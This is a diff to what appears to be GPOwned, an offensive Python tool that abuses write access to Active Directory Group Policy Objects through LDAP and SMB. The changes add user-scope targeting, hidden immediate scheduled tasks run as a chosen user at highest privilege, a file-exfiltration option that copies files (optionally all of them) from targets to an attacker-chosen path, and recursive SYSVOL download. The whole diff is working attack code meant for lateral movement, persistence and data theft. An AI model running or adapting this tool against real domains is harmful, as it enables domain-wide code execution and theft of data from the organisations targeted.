@@ -3,6 +3,7 @@
 # Author: Juan Manuel Fernandez (@TheXC3LL)
 
 
+import os
 import sys
 import argparse
 import logging
@@ -12,7 +13,7 @@ from impacket.smbconnection import SMBConnection
 from datetime import datetime
 
 class GPOhelper:
-    def __init__(self, username, password, domain, lmhash, nthash, dcHost):
+    def __init__(self, username, password, domain, lmhash, nthash, dcHost, scope, context):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -24,6 +25,17 @@ class GPOhelper:
         self.ldaprecords = []
 
         self.smbconn = ''
+
+
+
+        if scope == "gPCUserExtensionNames":
+            self.gpoattr = scope
+            self.gpopath = "User"
+        elif scope == "gPCMachineExtensionNames":
+            self.gpoattr = scope
+            self.gpopath = "Machine"
+
+        self.context = context
 
         # From GetADUsers.py - Create BaseDN
         domainParts = self.__domain.split('.')
@@ -142,19 +154,19 @@ class GPOhelper:
         self.tmpName = "/tmp/GPOwned.tmp"
 
         self.template_file_new = '<?xml version="1.0" encoding="utf-8"?><Files clsid="{215B2E53-57CE-475c-80FE-9EEC14635851}"></Files>'
-        self.template_file = '<File clsid="{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}" name="CHANGEME_NAME" status="CHANGEME_NAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}"><Properties action="C" fromPath="CHANGEME_FROMPATH" targetPath="CHANGEME_TOPATH" readOnly="0" archive="1" hidden="CHANGEME_HIDDEN"/></File></Files>'
+        self.template_file = '<File clsid="{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}" name="CHANGEME_NAME" status="CHANGEME_NAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties action="C" fromPath="CHANGEME_FROMPATH" targetPath="CHANGEME_TOPATH" readOnly="0" archive="1" hidden="CHANGEME_HIDDEN"/></File></Files>'
 
         self.template_folder_new = '<?xml version="1.0" encoding="utf-8"?><Folders clsid="{77CC39E7-3D16-4f8f-AF86-EC0BBEE2C861}"></Folders>'
-        self.template_folder = '<Folder clsid="{07DA02F5-F9CD-4397-A550-4AE21B6B4BD3}" name="CHANGEME_NAME" status="CHANGEME_NAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}"><Properties action="C" path="CHANGEME_PATH" readOnly="0" archive="1" hidden="CHANGEME_HIDDEN"/></Folder></Folders>'
+        self.template_folder = '<Folder clsid="{07DA02F5-F9CD-4397-A550-4AE21B6B4BD3}" name="CHANGEME_NAME" status="CHANGEME_NAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties action="C" path="CHANGEME_PATH" readOnly="0" archive="1" hidden="CHANGEME_HIDDEN"/></Folder></Folders>'
 
         self.template_registry_new = '<?xml version="1.0" encoding="utf-8"?><RegistrySettings clsid="{A3CCFC41-DFDB-43a5-8D26-0FE8B954DA51}"></RegistrySettings>'
-        self.template_registry = '<Registry clsid="{9CD4B2F4-923D-47f5-A062-E897DD1DAD50}" name="CHANGEME_NAME" status="CHANGEME_STATUS" image="5" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}"><Properties action="C" displayDecimal="1" default="CHANGEME_DEFAULT" hive="CHANGEME_HIVE" key="CHANGEME_KEY" name="CHANGEME_SUBKEY" type="CHANGEME_TYPE" value="CHANGEME_VALUE"/></Registry></RegistrySettings>'
+        self.template_registry = '<Registry clsid="{9CD4B2F4-923D-47f5-A062-E897DD1DAD50}" name="CHANGEME_NAME" status="CHANGEME_STATUS" image="5" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties action="C" displayDecimal="1" default="CHANGEME_DEFAULT" hive="CHANGEME_HIVE" key="CHANGEME_KEY" name="CHANGEME_SUBKEY" type="CHANGEME_TYPE" value="CHANGEME_VALUE"/></Registry></RegistrySettings>'
 
         self.template_service_new = '<?xml version="1.0" encoding="utf-8"?><NTServices clsid="{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}"></NTServices>'
-        self.template_service = '<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="CHANGEME_NAME" image="2" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}"><Properties startupType="AUTOMATIC" serviceName="CHANGEME_NAME" serviceAction="CHANGEME_ACTION" timeout="30" accountName="LocalSystem" interact="0"/></NTService></NTServices>'
+        self.template_service = '<NTService clsid="{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}" name="CHANGEME_NAME" image="2" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT"><Properties startupType="AUTOMATIC" serviceName="CHANGEME_NAME" serviceAction="CHANGEME_ACTION" timeout="30" accountName="LocalSystem" interact="0"/></NTService></NTServices>'
 
         self.template_task_new = '<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"></ScheduledTasks>'
-        self.template_task = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="CHANGEME_TASKNAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="0" removePolicy="0"><Properties action="C" name="CHANGEME_TASKNAME" runAs="NT AUTHORITY\System" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>CHANGEME_AUTHOR</Author><Description>CHANGEME_DESCRIPTION</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>CHANGEME_LOCATION</Command></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>'
+        self.template_task = '<ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="CHANGEME_TASKNAME" image="0" changed="CHANGEME_TIMESTAMP" uid="{CHANGEME_UID}" userContext="CHANGEME_CONTEXT" removePolicy="0"><Properties action="C" name="CHANGEME_TASKNAME" runAs="CHANGEME_USER" logonType="S4U"><Task version="1.2"><RegistrationInfo><Author>CHANGEME_AUTHOR</Author><Description>CHANGEME_DESCRIPTION</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>CHANGEME_USER</UserId><LogonType>S4U</LogonType><RunLevel>HighestPrivilege</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT5M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context="Author"><Exec><Command>CHANGEME_LOCATION</Command></Exec></Actions></Task></Properties></ImmediateTaskV2></ScheduledTasks>'
 
 
 
@@ -184,6 +196,22 @@ class GPOhelper:
         data = fh.read()
         fh.close()
         return data
+
+    def SMBDownloadRecursive(self, path, dst):
+        if "sysvol" in path.lower():
+            path = self.fixPath(path)
+        print("[*] Enumerating files at \SysVol%s" % path)
+        files = self.smbconn.listPath('SysVol', path + "/*")
+        for f in files:
+            current = path + "/" + f.get_longname()
+            if f.is_directory() > 0:
+                if f.get_longname() != "." and f.get_longname() != "..":
+                    os.mkdir(dst + path[path.index("}") + 1:] + "/" + f.get_longname())
+                    recursion = self.SMBDownloadRecursive(current, dst)
+            else:
+                fh = open(dst + path[path.index("}") + 1:] + "/" + f.get_longname(), "wb")
+                print("[*] Downloading \Sysvol%s" % current)
+                self.smbconn.getFile('SysVol', current, fh.write)
 
     def SMBWriteFile(self, path, content):
         print("[*] Writing %s" % path)
@@ -254,8 +282,8 @@ class GPOhelper:
         info.append(tmp)
         guids = self.info2GUID(info)
         strguids = self.GUID2str(guids)
-        print("[*] Updating gPCMachineExtensionNames")
-        self.ldapconn.modify(dn, {'gPCMachineExtensionNames':(ldap3.MODIFY_REPLACE, [strguids])})
+        print("[*] Updating " + self.gpoattr)
+        self.ldapconn.modify(dn, {self.gpoattr:(ldap3.MODIFY_REPLACE, [strguids])})
         if self.ldapconn.result['result'] != 0:
             raise
 
@@ -264,7 +292,7 @@ class GPOhelper:
         dn = gpoInfo[0]["dn"]
         origPath = str(gpoInfo[0]["gPCFileSysPath"])
         path = self.fixPath(origPath)
-        info = self.GUID2info(gpoInfo[0]['gPCMachineExtensionNames'])
+        info = self.GUID2info(gpoInfo[0][self.gpoattr])
         ret = (path, info, dn)
         return ret
 
@@ -273,7 +301,7 @@ class GPOhelper:
         return self.ldapconn.search(base, searchFilter, attributes=attributes)
 
     def ldapGPOInfo(self, displayname, name):
-        searchFilter = "(&(objectCategory=groupPolicyContainer)(displayName=%s)(name=%s))" % (displayname, name)
+        searchFilter = "(&(objectCategory=groupPolicyContainer)(displayName=%s)(name=%s)(%s=*))" % (displayname, name, self.gpoattr)
         if self.ldapconn == '':
             self.conn2ldap()
         print("[*] Requesting GPOs info from LDAP")
@@ -288,7 +316,7 @@ class GPOhelper:
                 'Name' : entry["name"],
                 'displayName' : entry["displayName"],
                 'gPCFileSysPath' : entry["gPCFileSysPath"],
-                'gPCMachineExtensionNames' : entry["gPCMachineExtensionNames"],
+                self.gpoattr : entry[self.gpoattr],
                 'versionNumber' : entry["versionNumber"]
             }
             self.ldaprecords.append(tmp)
@@ -314,7 +342,8 @@ class GPOhelper:
         return self.ldaprecords
 
     def fixPath(self, path):
-        path = path[path.index("\\SysVol\\")+7:]
+        path = path.lower()
+        path = path[path.index("\\sysvol\\")+7:]
         return path
 
     def updateVersion(self, gpo):
@@ -349,13 +378,28 @@ class GPOhelper:
             raise
         print("[+] Version updated succesfully!")
 
+    def GPOBackup(self, location, gpo):
+        print("[*] Creating backup folder")
+        os.mkdir(location)
+        entries = self.ldapGPOInfo('*', gpo)
+        info = entries[0][self.gpoattr]
+        print("[*] Saving " + self.gpoattr + " values as " + self.gpoattr + ".txt")
+        file = open(location + "/" + self.gpoattr + ".txt", "w")
+        file.write(str(info))
+        file.close()
+        if self.smbconn == '':
+            self.conn2smb()
+        root = str(entries[0]["gPCFileSysPath"])
+        files = self.SMBDownloadRecursive(root, location)
+
+
 
     def GPOCopyFile(self, srcPath, dstPath, hidden, gpo):
         (path, info, dn) = self.extractInfo(gpo)
 
         filename = dstPath[dstPath.rindex("\\") + 1:]
-        remotePath = path + "\\Machine\\" + filename
-        xmlPath = path + "\\Machine\\Preferences\\Files\\Files.xml"
+        remotePath = path + "\\" + self.gpopath + "\\" + filename
+        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Files\\Files.xml"
 
         template = self.template_file.replace("CHANGEME_NAME", filename)
         now = datetime.now()
@@ -364,10 +408,11 @@ class GPOhelper:
         if srcPath[:2] == "\\\\":
             template = template.replace("CHANGEME_FROMPATH", srcPath)
         else:
-            template = template.replace("CHANGEME_FROMPATH", path + "\\Machine\\" + filename)
+            template = template.replace("CHANGEME_FROMPATH", path + "\\" + self.gpopath + "\\" + filename)
         template = template.replace("CHANGEME_TOPATH", dstPath)
         template = template.replace("CHANGEME_HIDDEN", str(hidden))
         template = template.replace("CHANGEME_UID", self.generateGUID())
+        template = template.replace("CHANGEME_CONTEXT", self.context)
 
         if self.smbconn == '':
             self.conn2smb()
@@ -385,7 +430,7 @@ class GPOhelper:
         else:
             k = "Files"
             try:
-                self.smbconn.createDirectory('SysVol', path + "\\Machine\\Preferences\\Files")
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Files")
             except:
                 pass
             orig = bytes(self.template_file_new.encode("utf-8"))
@@ -394,12 +439,52 @@ class GPOhelper:
 
         self.updateGUID(info, k, ['Group Policy Files', 'Files'], dn)
 
+    def GPOExfilFiles(self, srcPath, dstPath, hidden, gpo):
+        (path, info, dn) = self.extractInfo(gpo)
+
+        filename = dstPath[dstPath.rindex("\\") + 1:]
+        remotePath = path + "\\" + self.gpopath + "\\" + filename
+        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Files\\Files.xml"
+
+        template = self.template_file.replace("CHANGEME_NAME", filename)
+        now = datetime.now()
+        date = now.strftime("%Y-%m-%d %H:%M:%S")
+        template = template.replace("CHANGEME_TIMESTAMP", date)
+        template = template.replace("CHANGEME_FROMPATH", srcPath)
+        template = template.replace("CHANGEME_TOPATH", dstPath)
+        template = template.replace("CHANGEME_HIDDEN", str(hidden))
+        template = template.replace("CHANGEME_UID", self.generateGUID())
+        template = template.replace("CHANGEME_CONTEXT", self.context)
+
+        if self.smbconn == '':
+            self.conn2smb()
+
+        if "Files" in info[0]:
+            k = ""
+            try:
+                orig = self.SMBReadFile(xmlPath)
+                modified = orig.replace(b'</Files>', bytes(template.encode("utf-8")))
+                self.SMBWriteFile(xmlPath, modified)
+            except:
+                raise
+        else:
+            k = "Files"
+            try:
+                self.smbconn.createDirectory('SysVol', path + "\\" + self.gpopath + "\\Preferences\\Files")
+            except:
+                pass
+            orig = bytes(self.template_file_new.encode("utf-8"))
+            modified = orig.replace(b'</Files>', bytes(template.encode("utf-8")))
+            self.SMBWriteFile(xmlPath, modified)
+        self.updateGUID(info, k, ['Group Policy Files', 'Files'], dn)
+
+
 
     def GPOCreateFolder(self, dstPath, hidden, gpo):
         (path, info, dn) = self.extractInfo(gpo)
 
         foldername = dstPath[dstPath.rindex("\\") + 1:]
-        xmlPath = path + "\\Machine\\Preferences\\Folders\\Folders.xml"
+        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Folders\\Folders.xml"
 
         template = self.template_folder.replace("CHANGEME_NAME", foldername)
         now = datetime.now()
@@ -408,6 +493,7 @@ class GPOhelper:
         template = template.replace("CHANGEME_PATH", dstPath)
         template = template.replace("CHANGEME_HIDDEN", str(hidden))
         template = template.replace("CHANGEME_UID", self.generateGUID())
+        template = template.replace("CHANGEME_CONTEXT", self.context)
 
         if self.smbconn == '':
             self.conn2smb()
@@ -423,7 +509,7 @@ class GPOhelper:
         else:
             k = "Folders"
             try:
-                self.smbconn.createDirectory('Sysvol', path + "\\Machine\\Preferences\\Folders")
+                self.smbconn.createDirectory('Sysvol', path + "\\" + self.gpopath + "\\Preferences\\Folders")
             except:
                 pass
             orig = bytes(self.template_folder_new.encode("utf-8"))
@@ -436,7 +522,7 @@ class GPOhelper:
 
     def GPORegCreate(self, hive, key, subkey, t, value, default, gpo):
         (path, info, dn) = self.extractInfo(gpo)
-        xmlPath = path + "\\Machine\\Preferences\\Registry\\Registry.xml"
+        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\Registry\\Registry.xml"
 
         if subkey == "":
             name = key[key.rindex("\\") + 1:]
@@ -449,6 +535,7 @@ class GPOhelper:
         date = now.strftime("%Y-%m-%d %H:%M:%S")
         template = template.replace("CHANGEME_TIMESTAMP", date)
         template = template.replace("CHANGEME_UID", self.generateGUID())
+        template = template.replace("CHANGEME_CONTEXT", self.context)
         template = template.replace("CHANGEME_DEFAULT", default)
         template = template.replace("CHANGEME_HIVE", hive)
         template = template.replace("CHANGEME_KEY", key)
@@ -470,7 +557,7 @@ class GPOhelper:
         else:
             k = "Registry"
             try:
-                self.smbconn.createDirectory('SysVol', path + "\\Machine\\Preferences\\Registry")
+                self.smbconn.createDirectory('SysVol', path + "\\"+ self.gpopath +"\\Preferences\\Registry")
             except:
                 pass
             orig = bytes(self.template_registry_new.encode("utf-8"))
@@ -482,13 +569,14 @@ class GPOhelper:
 
     def GPOService(self, action, name, gpo):
         (path, info, dn) = self.extractInfo(gpo)
-        xmlPath = path + "\\Machine\\Preferences\\Services\\Services.xml"
+        xmlPath = path + "\\" + self.gpopath +"\\Preferences\\Services\\Services.xml"
 
         now = datetime.now()
         date = now.strftime("%Y-%m-%d %H:%M:%S")
         template = self.template_service.replace("CHANGEME_NAME", name)
         template = template.replace("CHANGEME_TIMESTAMP", date)
         template = template.replace("CHANGEME_UID", self.generateGUID())
+        template = template.replace("CHANGEME_CONTEXT", self.context)
         template = template.replace("CHANGEME_ACTION", action)
 
         if self.smbconn == '':
@@ -505,7 +593,7 @@ class GPOhelper:
         else:
             k = "Services"
             try:
-                self.smbconn.createDirectory('Sysvol', path + "\\Machine\\Preferences\\Services")
+                self.smbconn.createDirectory('Sysvol', path + "\\" + self.gpopath + "\\Preferences\\Services")
             except:
                 pass
             orig = bytes(self.template_service_new.encode("utf-8"))
@@ -513,20 +601,21 @@ class GPOhelper:
             self.SMBWriteFile(xmlPath, modified)
         self.updateGUID(info, k, ['Group Policy Services', 'Services'], dn)
 
-    def GPOImmTask(self, taskname, author, description, location, gpo):
+    def GPOImmTask(self, taskname, author, description, location, user, gpo):
         (path, info, dn) = self.extractInfo(gpo)
 
-        xmlPath = path + "\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
+        xmlPath = path + "\\" + self.gpopath + "\\Preferences\\ScheduledTasks\\ScheduledTasks.xml"
 
         template = self.template_task.replace("CHANGEME_TASKNAME", taskname)
         now = datetime.now()
         date = now.strftime("%Y-%m-%d %H:%M:%S")
         template = template.replace("CHANGEME_TIMESTAMP", date)
         template = template.replace("CHANGEME_UID", self.generateGUID())
+        template = template.replace("CHANGEME_CONTEXT", self.context)
         template = template.replace("CHANGEME_AUTHOR", author)
         template = template.replace("CHANGEME_DESCRIPTION", description)
         template = template.replace("CHANGEME_LOCATION", location)
-
+        template = template.replace("CHANGEME_USER", user)
         if self.smbconn == '':
             self.conn2smb()
 
@@ -541,7 +630,7 @@ class GPOhelper:
         else:
             k = "Scheduled Tasks"
             try:
-                self.smbconn.createDirectory('Sysvol', path + "\\Machine\\Preferences\\ScheduledTasks")
+                self.smbconn.createDirectory('Sysvol', path + "\\"+ self.gpopath + "\\Preferences\\ScheduledTasks")
             except:
                 pass
             orig = bytes(self.template_task_new.encode("utf-8"))
@@ -556,7 +645,6 @@ def main():
     parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
     parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
     parser.add_argument('-dc-ip', action="store", metavar = "ip address", help='IP Address of the domain controller')
-
     parser.add_argument('-listgpo', action="store_true", help='Retrieve GPOs info using LDAP')
     parser.add_argument('-displayname', action="store", metavar = "display name", help='Filter using the given displayName [only with -listgpo]')
     parser.add_argument('-name', action="store", metavar = 'GPO name', help='Filter using the GPO name ({Hex})')
@@ -566,7 +654,9 @@ def main():
     parser.add_argument('-gpomkdir', action="store_true", help='Edit the target GPO to create a new folder')
     parser.add_argument('-gporegcreate', action = "store_true", help='Edit the target GPO to create a registry key/subkey')
     parser.add_argument('-gposervice', action="store_true", help='Edit the target GPO to start/stop/restart a service')
+    parser.add_argument('-gpoexfilfiles', action="store_true", help='Edit the target GPO to exfil a file (* to all) to the target location')
     parser.add_argument('-gpoimmtask', action="store_true", help='Edit the target GPO to add a Immediate Task')
+    parser.add_argument('-gpoimmuser', action="store", metavar="User for ImmTask", help="User to run the immediate task")
     parser.add_argument('-srcpath', action="store", metavar='Source file', help='Local file path')
     parser.add_argument('-dstpath', action="store", metavar='Destination path', help='Destination path')
     parser.add_argument('-hive', action="store", metavar='Registry Hive', help="Registry Hive")
@@ -580,6 +670,11 @@ def main():
     parser.add_argument('-author', action="store", metavar="Task Author", help="Author for Scheduled Task")
     parser.add_argument('-taskname', action="store", metavar="Task Name", help="Name for the Scheduled Task")
     parser.add_argument('-taskdescription', action="store", metavar="Task description", help="Description for the scheduled task")
+    parser.add_argument('-gpcuser', action="store_true", help="GPO is related to users")
+    parser.add_argument('-gpcmachine', action="store_true", help="GPO is related to machines")
+    parser.add_argument('-gpoupdatever', action="store_true", help="Update GPO version (GPT.INI file and LDAP object)")
+    parser.add_argument('-usercontext', action="store_true", help="Execute the GPO in the context of the user")
+    parser.add_argument('-backup', action="store", metavar="Backup location", help="Location of backup folder")
     options = parser.parse_args()
 
 
@@ -593,8 +688,19 @@ def main():
         lmhash = ''
         nthash = ''
 
+    if options.gpcuser is True:
+        scope = "gPCUserExtensionNames"
+    elif options.gpcmachine is True:
+        scope = "gPCMachineExtensionNames"
+    else:
+        print("[!] Error. Need -gpcuser or -gpcmachine!")
+        exit(-1)
 
-    helper = GPOhelper(options.username, options.password, options.domain, lmhash, nthash, options.dc_ip)
+    if options.usercontext is True:
+        context = str(1)
+    else:
+        context = str(0)
+    helper = GPOhelper(options.username, options.password, options.domain, lmhash, nthash, options.dc_ip, scope, context)
 
     # -listgpo
     if options.listgpo is True:
@@ -606,8 +712,8 @@ def main():
             name = options.name
         records = helper.ldapGPOInfo(displayname, name)
         for x in records:
-            print("\n[+] Name: %s\n\t[-] displayName: %s\n\t[-] gPCFileSysPath: %s\n\t[-] gPCMachineExtensionNames: %s\n\t[-] versionNumber: %s" % (x["Name"], x["displayName"], x["gPCFileSysPath"],x["gPCMachineExtensionNames"],  x["versionNumber"]))
-            guidinfo = helper.GUID2info(x["gPCMachineExtensionNames"])
+            print("\n[+] Name: %s\n\t[-] displayName: %s\n\t[-] gPCFileSysPath: %s\n\t[-] %s: %s\n\t[-] versionNumber: %s" % (x["Name"], x["displayName"], x["gPCFileSysPath"], scope, x[scope],  x["versionNumber"]))
+            guidinfo = helper.GUID2info(x[scope])
             print("\t[-] Verbose: ")
             for y in guidinfo:
                 print("\t\t---\t\t---")
@@ -633,6 +739,15 @@ def main():
             exit(-1)
         helper.GPOCopyFile(options.srcpath, options.dstpath, 0, options.name)
         helper.updateVersion(options.name)
+    
+    # -gpoexfilfiles
+    if options.gpoexfilfiles is True:
+        if options.srcpath is None or options.dstpath is None or options.name is None:
+            print("[!] Error! -gpoexfilfiles requires -name, -srcpath and -dstpath parameters")
+            exit(-1)
+        helper.GPOExfilFiles(options.srcpath, options.dstpath, 0, options.name)
+        helper.updateVersion(options.name)
+
 
     # -gpomkdir
     if options.gpomkdir is True:
@@ -675,10 +790,28 @@ def main():
     # -gpoimmtask
     if options.gpoimmtask is True:
         if options.author is None or options.taskdescription is None or options.taskname is None or options.dstpath is None or options.name is None:
-            print("[!] Error! -gpoimmtask requiers -name, -author, -taskname, -taskdescription and -dstpath parameters")
+            print("[!] Error! -gpoimmtask requires -name, -author, -taskname, -taskdescription and -dstpath parameters")
             exit(-1)
-        helper.GPOImmTask(options.taskname, options.author, options.taskdescription, options.dstpath, options.name)
+        if options.gpoimmuser != None:
+            user = options.gpoimmuser
+        else:
+            user = "NT Authority\\System"
+        helper.GPOImmTask(options.taskname, options.author, options.taskdescription, options.dstpath, user, options.name)
         helper.updateVersion(options.name)
+
+    # -gpoupdatever
+    if options.gpoupdatever is True:
+        if options.name is None:
+            print("[!] Error! -gpoupdatever requires -name parameter")
+            exit(-1)
+        helper.updateVersion(options.name)
+
+    # -backup
+    if options.backup is not None:
+        if options.name is None:
+            print("[!] Error! -backup requires -name parameter")
+            exit(-1)
+        helper.GPOBackup(options.backup, options.name)
 
 if __name__ == "__main__":
     print("\t\tGPO Helper - @TheXC3LL\n\n")
